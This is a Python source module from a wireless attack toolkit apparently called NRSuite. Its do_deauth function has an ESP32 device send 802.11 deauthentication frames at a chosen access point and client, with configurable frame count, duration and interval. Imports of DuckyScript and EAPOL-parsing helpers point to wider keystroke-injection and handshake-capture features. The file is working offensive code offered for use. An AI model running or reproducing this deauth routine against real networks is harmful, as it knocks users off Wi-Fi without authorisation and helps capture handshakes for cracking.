"""NRSuite command implementations.

These modules keep the original command behavior while getting the CLI entry
point out of a single monolithic file.
"""

import base64
import os
import re
import struct
import sys
import threading
import time

from ..config import DATA_DIR, HTML_CHUNK_SIZE, MAX_B64_LEN
from ..ui import C, _signal_bars, log
from ..bridge import _drain_stale, _setup_bridge, _wait_for_ready
from ..duckyscript import looks_like_script_line, split_pipe_commands as _split_pipe_commands
from ..eapol import parse_eapol_message

def do_deauth(fd: int = None, args=None):
    log("Starting deauth...", C.CYAN)
    log(f"Target: {args.bssid} | Channel: {args.channel}", C.YELLOW)

    if args.duration > 0:
        log(f"Duration mode: {args.duration} seconds", C.YELLOW)
    elif args.count > 0:
        log(f"Count mode: {args.count} frames", C.YELLOW)

    _, rx, tx, proto = _setup_bridge(fd)
    _drain_stale(rx)
    _wait_for_ready(proto)

    finished_evt = threading.Event()

    def on_event(ev):
        if ev and ev.get("type") == "deauth_stats":
            log(f"  Frames sent : {ev.get('sent_frames')}", C.GREEN, level="ok")
            if ev.get("status") == "finished":
                finished_evt.set()

    proto.on_event = on_event
    proto.start()

    dc_args = {
        "bssid": str(args.bssid),
        "client": str(args.client),
        "channel": int(args.channel),
        "count": int(args.count),
        "duration": int(args.duration),
        "deauth_interval_ms": int(args.interval),
        "reason": 7
    }

    resp = proto.send_cmd("DEAUTH", dc_args, timeout=60)

    if resp and resp.get("ok"):
        log("Deauth command accepted by ESP32", C.GREEN)
        if not finished_evt.wait(timeout=65):
            log("Deauth completed (timeout waiting for final stats)", level="warn")
    else:
        log("Failed to start deauth", C.RED, level="err")

    proto.stop()
    rx.stop()
    rx.join(timeout=3)

    log("Deauth finished.", C.GREEN)
